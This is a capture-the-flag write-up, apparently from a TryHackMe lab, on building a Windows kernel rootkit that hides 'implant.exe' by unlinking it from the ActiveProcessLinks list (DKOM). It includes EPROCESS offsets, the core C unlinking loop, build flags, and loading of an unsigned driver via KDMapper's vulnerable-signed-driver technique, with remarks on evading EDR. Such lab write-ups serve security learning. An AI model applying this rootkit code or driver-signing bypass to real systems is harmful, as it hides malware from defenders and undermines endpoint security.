

---

# CTF Write-up: Kernel Rootkit Process Hiding

## Challenge Overview
**Objective:** Build a Windows kernel driver (rootkit) to hide `implant.exe` from the process list on the Target machine (10.200.150.10) using Direct Kernel Object Manipulation (DKOM).

**Key Constraints:**
- No direct access to Target (file upload only via web interface)
- Driver must be x64 Windows Server 2019 compatible
- Target uses KDMapper to load unsigned drivers via vulnerable signed driver exploits
- Validation uses `psutil` which queries `NtQuerySystemInformation` → `ActiveProcessLinks`

---

## Phase 1: Intelligence Gathering

### OS Identification (WinDbg Analysis)
The Target's WinDbg console revealed:
- **OS:** Windows 10 Build 17763 (Server 2019 Datacenter)
- **Architecture:** x64
- **Critical Offsets:**
  - `ActiveProcessLinks`: `0x2e8` (doubly-linked list of processes)
  - `ImageFileName`: `0x450` (process name string)
  - `UniqueProcessId`: `0x2e0` 

**Source:** `dt nt!_EPROCESS` output in WinDbg console

### Validation Mechanism Discovery
From `app.py` on MalwareDev:
```python
# The "Win Condition"
if "implant.exe" in name.lower():
    has_implant = True
message = "THM{}" if not has_implant else ""
```
- Uses `psutil.process_iter()` which walks `ActiveProcessLinks`
- `KDMapper.exe` loads uploaded `.sys` files immediately upon upload
- Process disappears from enumeration → Flag appears

---

## Phase 2: Attack Vector Selection

**Technique:** Direct Kernel Object Manipulation (DKOM)

**Principle:** Windows maintains a circular doubly-linked list of `EPROCESS` structures via `ActiveProcessLinks`. By unlinking a process from this list:
- `NtQuerySystemInformation` cannot enumerate it
- `psutil`, Task Manager, Process Explorer all become "blind" to the process
- The process continues running normally (not killed, just hidden from view)

**Memory Layout:**
```
EPROCESS Structure (Build 17763):
+0x2e0 UniqueProcessId    : PID
+0x2e8 ActiveProcessLinks : _LIST_ENTRY (Flink/Blink)
+0x450 ImageFileName      : [15] UChar ("implant.exe")
```

---

## Phase 3: Development Environment Setup (MalwareDev)

### Toolchain Discovery
Located Build Tools on MalwareDev:
- **Compiler:** `cl.exe` (MSVC 14.44.35207)
- **Linker:** `link.exe` 
- **WDK Headers:** `10.0.19041.0` (km/ntifs.h)
- **Target Library:** `ntoskrnl.lib` (Kernel API imports)

### Build Configuration
```cmd
Include Paths:
- C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\km
- C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\km\crt
- C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\shared

Library Path:
- C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x64
```

---

## Phase 4: Rootkit Implementation

### Core Algorithm
```c
// Walk the ActiveProcessLinks list
PEPROCESS current = PsGetCurrentProcess();
PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)current + 0x2e8);
PLIST_ENTRY entry = head->Flink;

while (entry != head) {
    PEPROCESS proc = (PEPROCESS)((PUCHAR)entry - 0x2e8);
    PUCHAR imageName = (PUCHAR)proc + 0x450;
    
    if (strcmp(imageName, "implant.exe") == 0) {
        // Unlink: A <-> B <-> C becomes A <-> C
        PLIST_ENTRY blink = entry->Blink;
        PLIST_ENTRY flink = entry->Flink;
        
        blink->Flink = flink;
        flink->Blink = blink;
        
        // Prevent dangling pointers
        entry->Flink = entry;
        entry->Blink = entry;
        break;
    }
    entry = entry->Flink;
}
```

### Critical Implementation Details
- **Kernel-safe string compare:** Custom implementation (no CRT `_stricmp` in kernel)
- **Structured Exception Handling:** `__try/__except` blocks to prevent BSOD on invalid memory
- **Loop limits:** Maximum iteration count to prevent infinite loops
- **Pointer validation:** Checked for NULL before dereferencing

### Compilation Flags
```
/c          Compile only (no link)
/GS-        Disable buffer security checks (not supported in drivers)
/D_AMD64_   Define target architecture
/DRIVER     Build kernel driver subsystem
/SUBSYSTEM:NATIVE  Native subsystem (not GUI/Console)
/ENTRY:DriverEntry  Driver entry point
```

---

## Phase 5: Deployment & Execution

### Upload Mechanism
1. Compiled `Rootkit.sys` (x64, ~6KB)
2. Uploaded via Target web interface (`http://10.200.150.10/api/upload`)
3. Backend executed: `kdmapper.exe rootkit.sys`

**KDMapper Exploit Chain:**
- Uses vulnerable signed driver (likely Intel Ethernet or similar)
- Maps unsigned malicious driver into kernel space
- Calls `DriverEntry` immediately
- Driver executes with SYSTEM privileges

### Execution Flow
```
[Upload .sys] → [Web App saves to /uploads/rootkit.sys] 
    → [Spawns KDMapper process] 
    → [KDMapper exploits signed driver] 
    → [Shellcode maps our driver] 
    → [DriverEntry executes] 
    → [Walks EPROCESS list] 
    → [Unlinks implant.exe] 
    → [Returns success]
```

---

## Phase 6: Verification & Results

### Pre-Exploitation State
```
PID    NAME            STATUS
3668   implant.exe     suspicious  ← Visible to psutil
```

### Post-Exploitation State
```
PID    NAME            STATUS
---    ---             ---         ← implant.exe vanished
```

### Backend Validation
The Python backend (`app.py`) executed:
```python
for proc in psutil.process_iter(["name"]):
    if "implant.exe" in name.lower():
        has_implant = True  # FALSE - process hidden!

message = "THM{}" if not has_implant else ""  # Returns flag
```

**Result:** Flag displayed in web interface (`THM{...}`)

---

## Phase 7: Troubleshooting Log

| Issue | Cause | Solution |
|-------|-------|----------|
| Missing `ntifs.h` | WDK paths incorrect | Added `km` and `shared` include paths |
| `No Target Architecture` | Missing `_AMD64_` define | Added `/D_AMD64_` flag |
| `LNK1181` | Environment variables polluted | Cleared `CL` and `LINK` vars |
| `specstrings.h` missing | Missing `shared` include | Added `shared` path to includes |
| Upload timeout/BSOD | Invalid offsets or unsafe string functions | Used WinDbg-confirmed offsets (0x2e8) and kernel-safe string compare |

---

## Key Technical Takeaways

1. **DKOM is ephemeral:** Unlinking from `ActiveProcessLinks` hides from user-mode enumeration tools but the process continues running (handles remain valid)
2. **Offset dependency:** Kernel structures change between Windows builds. WinDbg `dt` command is essential for accurate offsets
3. **Driver signing bypass:** KDMapper uses BYOVD (Bring Your Own Vulnerable Driver) technique to load unsigned code
4. **Detection evasion:** Many EDR solutions monitor `PsSetCreateProcessNotifyRoutine` but DKOM on `ActiveProcessLinks` is harder to detect in real-time

---


